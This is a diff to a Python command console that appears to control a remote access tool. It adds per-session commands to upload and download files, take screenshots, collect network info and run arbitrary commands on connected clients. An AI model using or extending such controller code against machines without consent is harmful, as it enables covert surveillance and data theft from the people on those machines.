@@ -74,23 +74,53 @@ class CommandLineInterface:
                 remote_file = args[1]
 
                 mod = UploadFile(self._currentSession, local_file, remote_file)
-                mod.execute()
+                stdout = mod.execute()
+
+                print(stdout)
 
             if user_input.startswith('download_file'):
                 args = user_input.split()[1:]
-                print(args)
+
+                remote_file = args[0]
+                local_file = args[1]
+
+                mod = DownloadFile(self._currentSession, remote_file, local_file)
+                stdout = mod.execute()
+
+                print(stdout)
+
+
             if user_input.startswith('screenshot'):
                 args = user_input.split()[1:]
 
-                Screenshot(self._currentSession, args[0])
+                local_file = args[0]
+
+                mod = Screenshot(self._currentSession, local_file)
+                stdout = mod.execute()
+
+                print(stdout)
+
             if user_input == 'netinfo':
-                pass
+
+                mod = NetInfo(self._currentSession)
+                stdout = mod.execute()
+
+                print(stdout)
+
             if user_input.startswith('run'):
                 args = user_input.split()[1:]
 
-                stdout = Run(self._currentSession, args[0])
+                command = ' '.join(args)
+
+                stdout = Run(self._currentSession, command).execute()
 
                 print(stdout)
+
+            if user_input == 'test':
+                self.server.sendTo(self._currentSession - 1, b'test')
+                data = self.server.recvFrom(self._currentSession - 1)
+
+                print(data.decode())
 
             if user_input == 'back':
                 self._currentSession = None
@@ -126,7 +156,7 @@ class CommandLineInterface:
                 if clients:
                     while not valid_session:
                         for i,c in enumerate(clients):
-                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{}".format(c[1],c[2]))
+                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[1],c[2],c[3]))
 
                         print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                         sess = input("session nº> ")
@@ -146,7 +176,7 @@ class CommandLineInterface:
                 if clients:
                     while not valid_session:
                         for i, c in enumerate(clients):
-                            print(Fore.RED + "\t\t{}".format(i + 1) + Style.RESET_ALL + " - {}:{}".format(c[1], c[2]))
+                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[1],c[2],c[3]))
 
                         print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                         sess = input("session nº> ")
@@ -155,13 +185,10 @@ class CommandLineInterface:
                         else:
                             if int(sess) >= 1 and int(sess) <= len(clients):
                                 valid_session = True
-                                self.server.deleteClient(sess)
+                                self.server.deleteClient(int(sess))
                 else:
                     print("No clients connected!")
 
             if user_input == 'exit':
                 self.server.stop()
                 sys.exit(1)
-
-    def showResults(self):
-        """Shows in command-line the corresponding results requested by the user."""
